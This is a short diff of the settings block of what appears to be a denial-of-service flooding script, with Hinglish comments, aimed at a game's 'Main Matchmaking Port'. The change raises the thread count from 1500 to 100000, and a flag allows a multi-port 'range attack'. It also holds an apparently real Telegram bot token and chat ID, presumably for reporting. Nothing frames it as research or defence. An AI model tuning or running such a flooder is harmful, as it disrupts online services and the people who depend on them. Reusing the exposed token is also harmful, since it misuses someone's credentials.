@@ -12,7 +12,7 @@ BOT_TOKEN = "8817277726:AAFH9xmCfWcMOAgQceKee2qJvdCUUcw4v88"   # Apna Token
 CHAT_ID   = "8971948454"                          # Apna Chat ID
 
 # SETTINGS
-NUM_THREADS = 1500                     # 75+ ports wale error se bachne ke liye thode kam rakhein
+NUM_THREADS = 100000                    # 75+ ports wale error se bachne ke liye thode kam rakhein
 PACKET_SIZE = 8192                 # Standard size
 TARGET_PORT = 15876                   # Main Matchmaking Port
 USE_MULTI_PORT = False                # True karein agar aap range attack karna chahte hain
